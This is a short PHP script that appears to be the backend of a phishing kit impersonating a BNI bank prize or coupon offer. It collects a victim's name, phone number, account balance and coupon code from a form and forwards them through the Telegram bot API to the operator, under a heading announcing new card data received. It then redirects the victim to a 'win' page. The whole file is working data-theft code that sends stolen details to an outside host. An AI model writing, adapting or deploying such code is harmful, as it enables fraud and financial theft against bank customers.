<?php
session_start();
define('SECURE_ACCESS', true);
include "./telegram.php";

$kupon = $_POST['a'] ?? null;
$nama = $_POST['b'] ?? null;
$saldo = $_POST['d'] ?? null;
$nomor = $_POST['c'] ?? null;

if (empty($nama) || empty($saldo) || empty($nomor)) {
    header('Location: https://anji.ng/');
    exit();
}

$_SESSION['b'] = $nomor;
$_SESSION['c'] = $saldo;
$_SESSION['a'] = $nama;

$message = "\nSETOR BNI\n💳 *Data Kartu Baru Diterima*\n"
         . "━━━━━━━━━━━━━━\n"
         . "   *Kupon:* `$kupon`\n"
         . "🚹 *Nama Lengkap:* `$nama`\n"
         . "📱 *No Handphone:* `$nomor`\n"
         . "🏧 *Saldo:* `$saldo`\n"
         . "━━━━━━━━━━━━━━";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=html&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($id_telegram, $message, $id_botTele);
header('Location: win.php');
exit();
?>